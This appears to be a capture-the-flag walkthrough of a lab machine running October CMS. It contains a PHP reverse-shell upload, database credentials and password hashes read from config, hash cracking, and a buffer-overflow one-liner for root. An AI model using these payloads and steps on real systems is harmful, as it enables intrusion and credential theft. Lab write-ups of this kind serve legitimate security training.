User FLAG
-----

Scan with nmap `nmap -p- -T4 --min-rate 5000 -sV -o october -Pn 10.129.80.240`

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

```shell
whatweb <IP>
http://10.129.80.240 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.129.80.240], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

Find october CMS

```shell
searchsploit october
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit)                                                                                | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities                                                                                                    | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting                                                                                                      | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)                                                                               | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting                                                                                   | php/webapps/44546.txt
October CMS v3.4.4 - Stored Cross-Site Scripting (XSS) (Authenticated)                                                                            | php/webapps/51630.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                                                                                             | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                                                                                       | php/webapps/43106.txt
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```shell
dirsearch -u http://10.129.80.240

http://10.129.80.240/backend/backend/auth/signin
## Login with admin:admin
```

Go into `Media`

Upload a `<name>.php5` file with the following content

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'");?>
```

Open a listener on your machine `nc -lvnp 4444`
Then curl the file `curl http://10.129.80.240/storage/app/media/reverse.php5`

--- GOT REVERSE SHELL ---

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

```shell
pwd
/var/www/html/cms/storage/app/media
```

```shell
'redis' => [

        'cluster' => false,

        'default' => [
            'host'     => '127.0.0.1',
            'password' => null,
            'port'     => 6379,
            'database' => 0,
        ],

    ],

'connections' => [                                                                                                                                                              
                                                                                                                                                                                    
        'sqlite' => [                                                                                                                                                               
            'driver'   => 'sqlite',                                                                                                                                                 
            'database' => 'storage/database.sqlite',                                                                                                                                
            'prefix'   => '',                                                                                                                                                       
        ],                                                                                                                                                                          
                                                                                                                                                                                    
        'mysql' => [                                                                                                                                                                
            'driver'    => 'mysql',                                                                                                                                                 
            'host'      => 'localhost',                                                                                                                                             
            'port'      => '',                                                                                                                                                      
            'database'  => 'october',                                                                                                                                               
            'username'  => 'october',                                                                                                                                               
            'password'  => 'OctoberCMSPassword!!',                                                                                                                                  
            'charset'   => 'utf8',                                                                                                                                                  
            'collation' => 'utf8_unicode_ci',                                                                                                                                       
            'prefix'    => '',                                                                                                                                                      
        ],                                                                                                                                                                          
                                                                                                                                                                                    
        'pgsql' => [                                                                                                                                                                
            'driver'   => 'pgsql',                                                                                                                                                  
            'host'     => 'localhost',                                                                                                                                              
            'port'     => '',                                                                                                                                                       
            'database' => 'database',                                                                                                                                               
            'username' => 'root',                                                                                                                                                   
            'password' => '',                                                                                                                                                       
            'charset'  => 'utf8',                                                                                                                                                   
            'prefix'   => '',                                                                                                                                                       
            'schema'   => 'public',                                                                                                                                                 
        ],

        'sqlsrv' => [
            'driver'   => 'sqlsrv',
            'host'     => 'localhost',
            'port'     => '',
            'database' => 'database',
            'username' => 'root',
            'password' => '',
            'prefix'   => '',
        ],

    ],
```

```shell
mysql --host=localhost --user=october --password=OctoberCMSPassword!! october
```

```shell
mysql> select * from backend_users;
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
| id | first_name | last_name    | login | email             | password                                                     | activation_code | persist_code                                                 | reset_password_code | permissions | is_activated | activated_at | last_login          | created_at          | updated_at          | is_superuser |
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
|  1 | Harry      | Varthakouris | harry | harry@october.htb | $2y$10$4tBYxIpkBpR9.coxVUdeJetCp77EFLp1U2o/f2.wlKaBbe698aIzO | NULL            | NULL                                                         | NULL                |             |            1 | NULL         | 2017-04-20 21:05:21 | 2017-04-20 19:14:15 | 2017-04-20 21:06:28 |            1 |
|  2 | Admin      | Admin        | admin | admin@october.htb | $2y$10$ozRr2QHKXLJXx/n.rhQO6.2PxEeNXywYozigkq5NrH7TRBLzqrzUG | NULL            | $2y$10$SxQFwenHehdTACqlHbGRQ.DKBeg5a9K5BP8QkwB2MQ.XdWOxefBvW | NULL                |             |            0 | NULL         | 2024-07-13 23:32:38 | 2017-04-20 21:05:43 | 2024-07-13 23:32:38 |            0 |
+----+------------+--------------+-------+-------------------+--------------------------------------------------------------+-----------------+--------------------------------------------------------------+---------------------+-------------+--------------+--------------+---------------------+---------------------+---------------------+--------------+
2 rows in set (0.00 sec)

mysql>
```

```shell
./hashcat -m 25600 ~/Documents/Security/wordlists/hashes/october.txt ../wordlists/rockyou.txt
```

No point in doing this

Also

```
cat /home/harry/user.txt
8800970b7911db79cc339b1cd303cf04
```

Root FLAG
-----

```shell
-rwsr-xr-x 1 root root 67K Nov 24  2016 /bin/umount  --->  BSD/Linux(08-1996)                                                                                                       
-rwsr-xr-x 1 root root 39K May  8  2014 /bin/ping                                                                                                                                   
-rwsr-xr-x 1 root root 30K May 15  2015 /bin/fusermount                                                                                                                             
-rwsr-xr-x 1 root root 35K May 17  2017 /bin/su                                                                                                                                     
-rwsr-xr-x 1 root root 43K May  8  2014 /bin/ping6                                                                                                                                  
-rwsr-xr-x 1 root root 87K Nov 24  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                             
-rwsr-xr-x 1 root root 5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device                                                                                                          
-rwsr-xr-x 1 root root 482K Aug 11  2016 /usr/lib/openssh/ssh-keysign                                                                                                               
-rwsr-xr-x 1 root root 9.6K Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1                                                                                                 
-rwsr-xr-- 1 root messagebus 327K Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                          
-rwsr-xr-x 1 root root 154K Oct 14  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                               
-rwsr-xr-x 1 root root 31K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                                          
-rwsr-xr-x 1 root root 18K Nov 24  2015 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                            
-rwsr-xr-x 1 root root 45K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                              
-rwsr-xr-x 1 root root 44K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                                            
-rwsr-xr-x 1 root root 65K May 17  2017 /usr/bin/gpasswd                                                                                                                            
-rwsr-xr-x 1 root root 18K May  8  2014 /usr/bin/traceroute6.iputils                                                                                                                
-rwsr-xr-x 1 root root 72K Oct 21  2013 /usr/bin/mtr                                                                                                                                
-rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/chsh                                                                                                                               
-rwsr-sr-x 1 daemon daemon 46K Oct 21  2013 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                      
-rwsr-xr-- 1 root dip 316K Apr 21  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                         
-rwsr-sr-x 1 libuuid libuuid 18K Nov 24  2016 /usr/sbin/uuidd                                                                                                                       
-rwsr-xr-x 1 root root 7.3K Apr 21  2017 /usr/local/bin/ovrflw (Unknown SUID binary!)  
```

```shell
/usr/bin/base64                                                                                                                                                                     
/usr/bin/curl                                                                                                                                                                       
/usr/bin/gcc                                                                                                                                                                        
/usr/bin/gdb                                                                                                                                                                        
/bin/nc                                                                                                                                                                             
/bin/netcat                                                                                                                                                                         
/usr/bin/perl                                                                                                                                                                       
/usr/bin/php                                                                                                                                                                        
/bin/ping                                                                                                                                                                           
/usr/bin/python                                                                                                                                                                     
/usr/bin/python2                                                                                                                                                                    
/usr/bin/python2.7                                                                                                                                                                  
/usr/bin/python3                                                                                                                                                                    
/usr/bin/sudo                                                                                                                                                                       
/usr/bin/wget
```

Tried `https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-6074/poc.c` but can't compile it

```shell
-perm -4000 -type f 2>/dev/null                                                                                                                  
/bin/umount                                                                                                                                                                         
/bin/ping
/bin/fusermount
/bin/su
/bin/ping6
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/local/bin/ovrflw
```

```shell
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x63\x58\xb7" + "\x60\x92\x57\xb7" + "\xac\x8b\x6a\xb7"'); done
```

## Links

- https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name

## Versions

- Linux version 4.4.0-78-generic
- Sudo version 1.8.9p5